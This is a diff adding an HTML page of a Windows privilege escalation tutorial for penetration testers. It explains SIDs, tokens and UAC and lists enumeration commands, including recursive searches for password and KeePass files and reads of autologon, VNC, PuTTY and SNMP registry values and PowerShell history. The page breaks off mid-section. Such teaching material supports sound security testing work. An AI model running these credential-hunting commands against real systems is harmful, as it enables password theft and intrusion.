@@ -1,0 +1,1599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Privilege Escalation - Privilege Escalation Guide</title>
+    <meta name="description" content="Comprehensive Linux and Windows Privilege Escalation Techniques and Tradecraft">
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <header class="site-header">
+    <div class="header-content">
+        <h1 class="site-title">
+            <a href="/">Privilege Escalation Guide</a>
+        </h1>
+        <p class="site-description">Comprehensive Linux and Windows Privilege Escalation Techniques and Tradecraft</p>
+    </div>
+    
+    <nav class="site-nav">
+        <ul>
+            <li><a href="/" >Home</a></li>
+            <li><a href="/docs/linux-privilege-escalation/" >Linux</a></li>
+            <li><a href="/docs/windows-privilege-escalation/" class="active">Windows</a></li>
+            <li><a href="https://gtfobins.org/" target="_blank">GTFOBins ↗</a></li>
+            <li><a href="https://medtrigui.github.io/escabin/" target="_blank">Escabin ↗</a></li>
+        </ul>
+    </nav>
+</header>
+
+    
+    <div class="container">
+        <main>
+            <article>
+    <header>
+        <h1>Windows Privilege Escalation</h1>
+        
+        <p class="lead">Systematic Windows privilege escalation through service exploitation, token impersonation, and registry abuse</p>
+        
+    </header>
+    
+    <h1 id="windows-privilege-escalation">Windows Privilege Escalation</h1>
+
+<h2 id="overview">Overview</h2>
+
+<p>Privilege escalation is the process of elevating access from unprivileged to privileged user status on Windows systems. During penetration testing, initial foothold is often gained as an unprivileged user, but administrative privileges are typically required to access sensitive data, configuration files, or extract password hashes.</p>
+
+<h2 id="learning-objectives">Learning Objectives</h2>
+
+<p>This guide covers essential Windows privilege escalation techniques:</p>
+
+<ul>
+  <li><strong>Enumerating Windows</strong> - Establishing situational awareness and gathering system information</li>
+  <li><strong>Leveraging Windows Services</strong> - Exploiting service misconfigurations for privilege escalation</li>
+  <li><strong>Abusing Other Windows Components</strong> - Utilizing Scheduled Tasks and other Windows features</li>
+  <li><strong>Exploiting Vulnerabilities</strong> - Leveraging system exploits for privilege elevation</li>
+</ul>
+
+<h2 id="table-of-contents">Table of Contents</h2>
+
+<ol>
+  <li><a href="#1-enumerating-windows">Enumerating Windows</a>
+    <ul>
+      <li><a href="#11-understanding-windows-privileges-and-access-control">1.1 Understanding Windows Privileges and Access Control</a></li>
+      <li><a href="#12-situational-awareness">1.2 Situational Awareness</a></li>
+      <li><a href="#13-hidden-in-plain-view">1.3 Hidden in Plain View</a></li>
+      <li><a href="#14-information-goldmine-powershell">1.4 Information Goldmine PowerShell</a></li>
+      <li><a href="#15-automated-enumeration">1.5 Automated Enumeration</a></li>
+    </ul>
+  </li>
+  <li><a href="#2-leveraging-windows-services">Leveraging Windows Services</a>
+    <ul>
+      <li><a href="#21-service-binary-hijacking">2.1 Service Binary Hijacking</a></li>
+      <li><a href="#22-dll-hijacking">2.2 DLL Hijacking</a></li>
+      <li><a href="#23-unquoted-service-paths">2.3 Unquoted Service Paths</a></li>
+    </ul>
+  </li>
+  <li><a href="#3-abusing-other-windows-components">Abusing Other Windows Components</a>
+    <ul>
+      <li><a href="#31-scheduled-tasks">3.1 Scheduled Tasks</a></li>
+      <li><a href="#32-using-exploits">3.2 Using Exploits</a></li>
+    </ul>
+  </li>
+</ol>
+
+<hr />
+
+<h1 id="1-enumerating-windows">1. Enumerating Windows</h1>
+
+<p>Every target system is unique due to OS versions, patch levels, and configurations. Understanding how to gather and leverage system information is crucial for privilege escalation. This section covers Windows privilege structures, situational awareness methods, and information gathering techniques.</p>
+
+<h2 id="11-understanding-windows-privileges-and-access-control">1.1 Understanding Windows Privileges and Access Control</h2>
+
+<p>Windows employs several security mechanisms to control access and privileges:</p>
+
+<h3 id="security-identifier-sid">Security Identifier (SID)</h3>
+
+<p>Windows uses SIDs to uniquely identify security principals (users, groups, computers).</p>
+
+<p><strong>SID Structure:</strong> <code class="language-plaintext highlighter-rouge">S-R-X-Y</code></p>
+<ul>
+  <li><strong>S</strong>: Literal “S” indicating SID</li>
+  <li><strong>R</strong>: Revision (always “1”)</li>
+  <li><strong>X</strong>: Identifier Authority (e.g., “5” for NT Authority)</li>
+  <li><strong>Y</strong>: Sub-authorities (Domain ID + Relative ID)</li>
+</ul>
+
+<p><strong>Example SID:</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>S-1-5-21-1336799502-1441772794-948155058-1001
+</code></pre></div></div>
+
+<p><strong>Well-Known SIDs:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">S-1-0-0</span><span class="w">                       </span><span class="c"># Nobody</span><span class="w">
+</span><span class="n">S-1-1-0</span><span class="w">                       </span><span class="c"># Everyone</span><span class="w">
+</span><span class="n">S-1-5-11</span><span class="w">                      </span><span class="c"># Authenticated Users</span><span class="w">
+</span><span class="n">S-1-5-18</span><span class="w">                      </span><span class="c"># Local System</span><span class="w">
+</span><span class="n">S-1-5-domainidentifier-500</span><span class="w">    </span><span class="c"># Administrator</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="access-tokens">Access Tokens</h3>
+
+<p>Access tokens contain security context information:</p>
+<ul>
+  <li>User SID</li>
+  <li>Group SIDs</li>
+  <li>Privileges</li>
+  <li>Token scope</li>
+</ul>
+
+<p><strong>Check token information:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="mandatory-integrity-control-mic">Mandatory Integrity Control (MIC)</h3>
+
+<p>Five integrity levels restrict process interactions:</p>
+
+<ol>
+  <li><strong>System</strong> - Highly trusted processes (Winlogon, LSASS)</li>
+  <li><strong>High</strong> - Elevated administrative processes</li>
+  <li><strong>Medium</strong> - Standard user processes (default)</li>
+  <li><strong>Low</strong> - Sandboxed/restricted processes</li>
+  <li><strong>Untrusted</strong> - Highly restricted processes</li>
+</ol>
+
+<p><strong>Check integrity levels:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Current user integrity</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Mandatory Label"</span><span class="w">
+
+</span><span class="c"># Process integrity</span><span class="w">
+</span><span class="n">Get-Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Id</span><span class="p">,</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="o">=</span><span class="s2">"IntegrityLevel"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{(</span><span class="n">Get-Process</span><span class="w"> </span><span class="nt">-Id</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Id</span><span class="p">)</span><span class="o">.</span><span class="nf">MainModule</span><span class="o">.</span><span class="nf">ModuleName</span><span class="p">}}</span><span class="w">
+
+</span><span class="c"># File integrity</span><span class="w">
+</span><span class="nx">icacls</span><span class="w"> </span><span class="nx">C</span><span class="err">:\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">System32</span><span class="err">\</span><span class="nx">cmd</span><span class="err">.</span><span class="nx">exe</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="user-account-control-uac">User Account Control (UAC)</h3>
+
+<p>UAC issues two tokens to administrators:</p>
+<ul>
+  <li><strong>Standard user token</strong> - Default operations</li>
+  <li><strong>Administrator token</strong> - Elevated operations</li>
+</ul>
+
+<p><strong>UAC Bypass Detection:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check if running with high integrity</span><span class="w">
+</span><span class="nv">$currentPrincipal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Security.Principal.WindowsPrincipal</span><span class="p">([</span><span class="n">Security.Principal.WindowsIdentity</span><span class="p">]::</span><span class="n">GetCurrent</span><span class="p">())</span><span class="w">
+</span><span class="nv">$currentPrincipal</span><span class="o">.</span><span class="nf">IsInRole</span><span class="p">([</span><span class="n">Security.Principal.WindowsBuiltInRole</span><span class="p">]::</span><span class="nx">Administrator</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># Check UAC settings</span><span class="w">
+</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">EnableLUA</span><span class="p">,</span><span class="w"> </span><span class="nx">ConsentPromptBehaviorAdmin</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="12-situational-awareness">1.2 Situational Awareness</h2>
+
+<p>Systematic information gathering is critical for privilege escalation success.</p>
+
+<h3 id="essential-information-checklist">Essential Information Checklist</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Core system information (referenced throughout this guide)</span><span class="w">
+</span><span class="n">whoami</span><span class="w">                    </span><span class="c"># Current user context</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w">              </span><span class="c"># Complete user information including groups and privileges</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">             </span><span class="c"># User privileges</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">           </span><span class="c"># Group memberships</span><span class="w">
+</span><span class="n">hostname</span><span class="w">                 </span><span class="c"># System hostname</span><span class="w">
+</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">COMPUTERNAME</span><span class="w">        </span><span class="c"># Alternative hostname method</span><span class="w">
+
+</span><span class="c"># System details</span><span class="w">
+</span><span class="n">systeminfo</span><span class="w">               </span><span class="c"># Complete system information</span><span class="w">
+</span><span class="n">Get-ComputerInfo</span><span class="w">         </span><span class="c"># PowerShell alternative</span><span class="w">
+
+</span><span class="c"># User and group enumeration</span><span class="w">
+</span><span class="n">Get-LocalUser</span><span class="w">            </span><span class="c"># Local users</span><span class="w">
+</span><span class="n">Get-LocalGroup</span><span class="w">           </span><span class="c"># Local groups  </span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w">                 </span><span class="c"># Command line alternative</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w">           </span><span class="c"># Command line alternative</span><span class="w">
+</span><span class="n">Get-LocalGroupMember</span><span class="w"> </span><span class="nx">Administrators</span><span class="w">
+</span><span class="n">Get-LocalGroupMember</span><span class="w"> </span><span class="s2">"Remote Desktop Users"</span><span class="w">
+</span><span class="n">Get-LocalGroupMember</span><span class="w"> </span><span class="s2">"Remote Management Users"</span><span class="w">
+
+</span><span class="c"># Network configuration</span><span class="w">
+</span><span class="n">ipconfig</span><span class="w"> </span><span class="nx">/all</span><span class="w">
+</span><span class="n">route</span><span class="w"> </span><span class="nx">print</span><span class="w">
+</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w">
+
+</span><span class="c"># Applications and processes</span><span class="w">
+</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">DisplayName</span><span class="w">
+</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">DisplayName</span><span class="w">
+</span><span class="n">Get-Process</span><span class="w">
+</span><span class="nx">tasklist</span><span class="w"> </span><span class="nx">/svc</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="advanced-system-enumeration">Advanced System Enumeration</h3>
+
+<p><strong>Environment Variables:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nx">Env:</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="p">[</span><span class="n">Environment</span><span class="p">]::</span><span class="n">GetEnvironmentVariables</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Scheduled Tasks:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">State</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"Ready"</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">TaskName</span><span class="p">,</span><span class="w"> </span><span class="nx">TaskPath</span><span class="p">,</span><span class="w"> </span><span class="nx">Author</span><span class="w">
+</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/query</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">LIST</span><span class="w"> </span><span class="nx">/v</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Services:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Status</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"Running"</span><span class="p">}</span><span class="w">
+</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">State</span><span class="p">,</span><span class="w"> </span><span class="nx">PathName</span><span class="p">,</span><span class="w"> </span><span class="nx">StartMode</span><span class="p">,</span><span class="w"> </span><span class="nx">StartName</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Drives and Shares:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-PSDrive</span><span class="w"> </span><span class="nt">-PSProvider</span><span class="w"> </span><span class="nx">FileSystem</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">share</span><span class="w">
+</span><span class="n">Get-SmbShare</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Registry Analysis:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># AutoRun entries</span><span class="w">
+</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU\Software\SimonTatham\PuTTY\Sessions</span><span class="w">
+
+
+</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="w">
+</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="s2">"HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="w">
+
+</span><span class="c"># Installed software</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">PSPath</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="13-hidden-in-plain-view">1.3 Hidden in Plain View</h2>
+
+<p>Sensitive information is often stored in easily accessible locations.</p>
+
+<h3 id="file-system-search-techniques">File System Search Techniques</h3>
+
+<p><strong>Search for sensitive files:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Password files</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*.</span><span class="nf">kdbx</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*</span><span class="nx">password</span><span class="o">*</span><span class="p">,</span><span class="o">*</span><span class="nx">pass</span><span class="o">*</span><span class="p">,</span><span class="o">*</span><span class="nx">pwd</span><span class="o">*</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+
+</span><span class="c"># Configuration files</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="p">,</span><span class="o">*.</span><span class="nf">ini</span><span class="p">,</span><span class="o">*.</span><span class="nf">xml</span><span class="p">,</span><span class="o">*.</span><span class="nf">conf</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+
+</span><span class="c"># Document files</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Users\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="p">,</span><span class="o">*.</span><span class="nf">pdf</span><span class="p">,</span><span class="o">*.</span><span class="nf">doc</span><span class="p">,</span><span class="o">*.</span><span class="nf">docx</span><span class="p">,</span><span class="o">*.</span><span class="nf">xls</span><span class="p">,</span><span class="o">*.</span><span class="nf">xlsx</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+
+</span><span class="c"># Backup files</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*.</span><span class="nf">bak</span><span class="p">,</span><span class="o">*.</span><span class="nf">backup</span><span class="p">,</span><span class="o">*.</span><span class="nf">old</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Search file contents:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Search for passwords in files</span><span class="w">
+</span><span class="n">Select-String</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\*"</span><span class="w"> </span><span class="nt">-Pattern</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w">
+
+</span><span class="c"># Search for specific keywords</span><span class="w">
+</span><span class="n">Select-String</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\*"</span><span class="w"> </span><span class="nt">-Pattern</span><span class="w"> </span><span class="s2">"admin|administrator|root|sa|service"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="common-sensitive-locations">Common Sensitive Locations</h3>
+
+<p><strong>Configuration Directories:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># IIS configuration</span><span class="w">
+</span><span class="n">Get-Content</span><span class="w"> </span><span class="s2">"C:\inetpub\wwwroot\web.config"</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+
+</span><span class="c"># Apache/XAMPP</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\xampp"</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="p">,</span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+
+</span><span class="c"># Application configs</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Program Files*"</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="p">,</span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>User Directories:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Desktop files</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Users\*\Desktop"</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="p">,</span><span class="o">*.</span><span class="nf">doc</span><span class="o">*</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+
+</span><span class="c"># Documents</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Users\*\Documents"</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="p">,</span><span class="o">*.</span><span class="nf">doc</span><span class="o">*</span><span class="p">,</span><span class="o">*.</span><span class="nf">pdf</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+
+</span><span class="c"># Downloads</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Users\*\Downloads"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="registry-password-locations">Registry Password Locations</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># VNC passwords</span><span class="w">
+</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\SOFTWARE\RealVNC\WinVNC4"</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+
+</span><span class="c"># Autologon credentials</span><span class="w">
+</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">DefaultUserName</span><span class="p">,</span><span class="w"> </span><span class="nx">DefaultPassword</span><span class="w">
+
+</span><span class="c"># Putty sessions</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions"</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+
+</span><span class="c"># SNMP parameters</span><span class="w">
+</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="14-information-goldmine-powershell">1.4 Information Goldmine PowerShell</h2>
+
+<p>PowerShell logging mechanisms often contain valuable credential information.</p>
+
+<h3 id="powershell-history-analysis">PowerShell History Analysis</h3>
+
+<p><strong>PSReadLine History:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get history file path</span><span class="w">
+</span><span class="p">(</span><span class="n">Get-PSReadlineOption</span><span class="p">)</span><span class="o">.</span><span class="nf">HistorySavePath</span><span class="w">
+
+</span><span class="c"># Read history content</span><span class="w">
+</span><span class="n">Get-Content</span><span class="w"> </span><span class="p">(</span><span class="n">Get-PSReadlineOption</span><span class="p">)</span><span class="o">.</span><span class="nf">HistorySavePath</span><span class="w">
+
+</span><span class="c"># Alternative history locations</span><span class="w">
+</span><span class="n">Get-Content</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="s2">\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"</span><span class="w">
+</span><span class="n">Get-Content</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERPROFILE</span><span class="s2">\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Built-in PowerShell History:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-History</span><span class="w">
+</span><span class="nx">Get-History</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Export-Csv</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"history.csv"</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="powershell-transcription">PowerShell Transcription</h3>
+
+<p><strong>Find transcript files:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Common transcript locations</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Users\*\Documents\*transcript*"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Transcripts"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Logs"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+
+</span><span class="c"># Search for transcript files by content</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="s2">"*.txt"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nt">-Pattern</span><span class="w"> </span><span class="s2">"Windows PowerShell transcript start"</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Analyze transcript content:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Look for credential creation patterns</span><span class="w">
